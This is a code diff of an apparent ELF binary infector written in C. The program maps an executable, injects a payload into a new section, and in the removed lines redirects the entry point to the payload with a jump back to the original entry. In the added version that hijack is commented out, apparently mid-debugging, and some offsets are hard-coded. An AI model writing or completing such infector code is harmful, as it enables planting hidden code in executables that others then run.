@@ -117,10 +117,14 @@ int main(void) {
         .sh_entsize = 0
     };
 
-    // Move section headers to make space for the new section header
-    Elf64_Shdr *new_shdrs = (Elf64_Shdr *)((char *)map + ehdr->e_shoff);
-    size_t move_size = sizeof(Elf64_Shdr) * (ehdr->e_shnum - (last_section_in_segment - shdrs));
-    memmove(new_shdrs + (last_section_in_segment - shdrs) + 1, new_shdrs + (last_section_in_segment - shdrs), move_size);
+    // Copy the payload data
+	memmove((char *)map + new_section_offset + sizeof(Elf64_Shdr), (char *)map + new_section_offset, filesize - new_section_offset);
+    memcpy((char *)map + new_section_offset, payload_p, payload_size_p);
+
+	// Move section headers to make space for the new section header
+    // Elf64_Shdr *new_shdrs = (Elf64_Shdr *)((char *)map + ehdr->e_shoff);
+    // size_t move_size = sizeof(Elf64_Shdr) * (ehdr->e_shnum - (last_section_in_segment - shdrs));
+    // memmove(new_shdrs + (last_section_in_segment - shdrs) + 1, new_shdrs + (last_section_in_segment - shdrs), move_size);
 
 	// Update the section header offsets
     for (int i = 0; i < ehdr->e_shnum; ++i) {
@@ -129,27 +133,23 @@ int main(void) {
         }
     }
 	
-    shdrs[ehdr->e_shnum] = new_shdr;
+    // shdrs[ehdr->e_shnum] = new_shdr;
 
-    // Copy the payload data
-	memmove((char *)map + new_section_offset + sizeof(Elf64_Shdr), (char *)map + new_section_offset, filesize - new_section_offset);
-    memcpy((char *)map + new_section_offset, payload_p, payload_size_p);
+    // // Update ELF header with new section count and string table index
+    // ehdr->e_shnum += 1;
+    // ehdr->e_shstrndx = ehdr->e_shnum - 1;
 
-    // Update ELF header with new section count and string table index
-    ehdr->e_shnum += 1;
-    ehdr->e_shstrndx = ehdr->e_shnum - 1;
+    // // Update the entry point
+    // Elf64_Addr old_entry_point = ehdr->e_entry;
+    // ehdr->e_entry = new_section_addr;
 
-    // Update the entry point
-    Elf64_Addr old_entry_point = ehdr->e_entry;
-    ehdr->e_entry = new_section_addr;
+    // // Calculate the relative jump offset to the old entry point
+    // int32_t jump_offset = (int32_t)(old_entry_point - (new_section_addr + payload_size_p - 5) - 5);
 
-    // Calculate the relative jump offset to the old entry point
-    int32_t jump_offset = (int32_t)(old_entry_point - (new_section_addr + payload_size_p - 5) - 5);
-
-    // Write the relative jump instruction at the end of the payload
-    size_t jump_instr_offset = payload_size_p - 1186 - 6 - 4;
-    *((uint8_t *)map + new_section_offset + jump_instr_offset) = 0xE9; // Opcode for jmp (relative)
-    memcpy((char *)map + new_section_offset + jump_instr_offset + 1, &jump_offset, sizeof(int32_t));
+    // // Write the relative jump instruction at the end of the payload
+    // size_t jump_instr_offset = payload_size_p - 1186 - 6 - 4;
+    // *((uint8_t *)map + new_section_offset + jump_instr_offset) = 0xE9; // Opcode for jmp (relative)
+    // memcpy((char *)map + new_section_offset + jump_instr_offset + 1, &jump_offset, sizeof(int32_t));
 
     // Cleanup
     if (munmap(map, new_filesize) == -1) {
